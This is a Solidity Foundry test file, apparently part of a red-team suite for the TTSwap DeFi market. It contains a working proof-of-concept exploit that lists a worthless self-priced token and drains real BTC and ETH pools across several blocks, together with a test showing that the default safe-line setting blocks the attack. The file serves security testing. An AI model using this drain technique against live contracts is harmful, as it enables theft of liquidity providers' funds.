// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import {BaseSetup} from "../BaseSetup.t.sol";
import {MyToken} from "../../src/test/MyToken.sol";
import {T_GoodKey, T_GoodKeyLibrary} from "../../src/type/T_GoodKey.sol";
import {L_GoodConfigLibrary} from "../../src/libraries/L_GoodConfig.sol";
import {TTSwapError} from "../../src/libraries/L_Error.sol";
import {
    L_TTSwapUINT256Library,
    toTTSwapUINT256
} from "../../src/libraries/L_TTSwapUINT256.sol";

/// @notice RT-08: Multi-transaction, cross-good drain driven by ONE self-priced fake good.
///
/// Objectives covered:
///  - #1 max profit / #2 min capital: worthless SCAM in, real BTC + ETH out
///  - #3 multi-transaction: output-good run-block guard forces one victim hit per block,
///        so full extraction is a loop across blocks
///  - #4 cross-good: a single fake good drains multiple independent victim pools
///  - #5 oracle manipulation: the self-declared V at initGood IS the only price source;
///        no external oracle bounds it (only min/max magnitude checks)
///
/// Precondition (same as RT-02): victim goods have safeLineUpper widened past 100%
/// (manager/ops footgun). On default config the sell-in reverts(55).
contract RT_MultiTxCrossGood is BaseSetup {
    using T_GoodKeyLibrary for T_GoodKey;
    using L_TTSwapUINT256Library for uint256;
    using L_GoodConfigLibrary for uint256;

    uint128 internal constant BTC_INIT_QTY = uint128(1 * 10 ** 8);
    uint128 internal constant BTC_INIT_VALUE = uint128(63_000 * 10 ** 12);
    uint128 internal constant ETH_INIT_QTY = uint128(100 * 10 ** 18);
    uint128 internal constant ETH_INIT_VALUE = uint128(300_000 * 10 ** 12);
    uint128 internal constant MIN_INIT_QTY = 500_000;
    uint128 internal constant MIN_INIT_VALUE = 500_000_000_000_000;

    MyToken internal scam;
    address internal attacker;
    uint256 internal btcGoodId;
    uint256 internal ethGoodId;
    uint256 internal scamGoodId;

    function setUp() public override {
        BaseSetup.setUp();
        attacker = users[4];
        vm.warp(100);

        btcGoodId = _init(_btcKey(), users[1], BTC_INIT_VALUE, BTC_INIT_QTY);
        ethGoodId = _init(_ethKey(), users[1], ETH_INIT_VALUE, ETH_INIT_QTY);
        _relaxSafeLine(btcGoodId);
        _relaxSafeLine(ethGoodId);

        scam = new MyToken("SCAM", "SCAM", 18);
    }

    function _btcKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(btc), id: 0});
    }

    function _ethKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(eth), id: 0});
    }

    function _scamKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(scam), id: 0});
    }

    function _init(
        T_GoodKey memory key,
        address owner,
        uint128 value,
        uint128 qty
    ) internal returns (uint256 goodId) {
        vm.startPrank(owner);
        deal(key.contractAddress, owner, 100 * uint256(qty), false);
        MyToken(payable(key.contractAddress)).approve(address(market), type(uint256).max);
        market.initGood(key, toTTSwapUINT256(value, qty), defaultdata, owner, defaultdata);
        _snapMarket("market_initGood_RT_MultiTxCrossGood.t_77");
        goodId = key.toId();
        vm.stopPrank();
    }

    function _sellScamInto(T_GoodKey memory victim, uint128 amountIn) internal returns (uint256 g2change) {
        scam.mint(attacker, amountIn);
        vm.startPrank(attacker);
        scam.approve(address(market), amountIn);
        _warpToFreshRunSlot(); // new block => victim output good's run-block slot is fresh
        (, g2change) = market.buyGood(
            _scamKey(),
            victim,
            toTTSwapUINT256(amountIn, 0),
            address(0),
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        _snapMarket("market_buyGood_RT_MultiTxCrossGood.t_96");
        vm.stopPrank();
    }

    /// @dev tx1 lists fake; tx2..txN loop-drain BTC across blocks; then cross to ETH.
    function test_RT08_multitx_crossgood_drain() public {
        // ── tx1: list worthless SCAM at the value floor (overpriced vs everything) ──
        vm.startPrank(attacker);
        scam.mint(attacker, 10 * MIN_INIT_QTY);
        scam.approve(address(market), type(uint256).max);
        market.initGood(
            _scamKey(),
            toTTSwapUINT256(MIN_INIT_VALUE, MIN_INIT_QTY),
            defaultdata,
            attacker,
            defaultdata
        );
        _snapMarket("market_initGood_RT_MultiTxCrossGood.t_112");
        vm.stopPrank();
        scamGoodId = _scamKey().toId();
        _relaxSafeLine(scamGoodId);

        uint256 btcBefore = btc.balanceOf(attacker);
        uint256 ethBefore = eth.balanceOf(attacker);
        uint256 scamSpent;

        // ── tx2..tx4: hit BTC pool once per block (run-block guard = forced multi-tx) ──
        uint128 chunk = 1000;
        for (uint256 i = 0; i < 3; i++) {
            _sellScamInto(_btcKey(), chunk);
            scamSpent += chunk;
        }

        // ── tx5..tx7: same fake good now drains a DIFFERENT victim pool (cross-good) ──
        for (uint256 i = 0; i < 3; i++) {
            _sellScamInto(_ethKey(), chunk);
            scamSpent += chunk;
        }

        uint256 btcProfit = btc.balanceOf(attacker) - btcBefore;
        uint256 ethProfit = eth.balanceOf(attacker) - ethBefore;

        emit log_named_uint("RT08 total SCAM spent (worthless)  ", scamSpent);
        emit log_named_uint("RT08 BTC drained (sats)            ", btcProfit);
        emit log_named_uint("RT08 ETH drained (wei)             ", ethProfit);

        // Capital is worthless SCAM; profit is real BTC + ETH from two independent pools.
        assertGt(btcProfit, 0, "BTC extracted from pool 1");
        assertGt(ethProfit, 0, "ETH extracted from pool 2");
        // Each 1000-wei SCAM chunk overprices heavily vs real assets.
        assertGt(btcProfit, 1000, "BTC profit exceeds nominal scam-in");
    }

    /// @dev Production default (safeLineUpper=100) blocks RT-08: scam input
    ///      leg cannot grow Q. No admin widen → revert 55, zero drain.
    function test_RT08_default_safeline_blocks_crossgood_drain() public {
        vm.startPrank(attacker);
        scam.mint(attacker, 10 * MIN_INIT_QTY);
        scam.approve(address(market), type(uint256).max);
        market.initGood(
            _scamKey(),
            toTTSwapUINT256(MIN_INIT_VALUE, MIN_INIT_QTY),
            defaultdata,
            attacker,
            defaultdata
        );
        vm.stopPrank();
        // deliberately NO _relaxSafeLine on scam

        uint256 btcBefore = btc.balanceOf(attacker);
        scam.mint(attacker, 1000);
        vm.startPrank(attacker);
        scam.approve(address(market), 1000);
        _warpToFreshRunSlot();
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 55));
        market.buyGood(
            _scamKey(),
            _btcKey(),
            toTTSwapUINT256(uint128(1000), 0),
            address(0),
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        vm.stopPrank();
        assertEq(btc.balanceOf(attacker), btcBefore, "no BTC drained");
    }
}
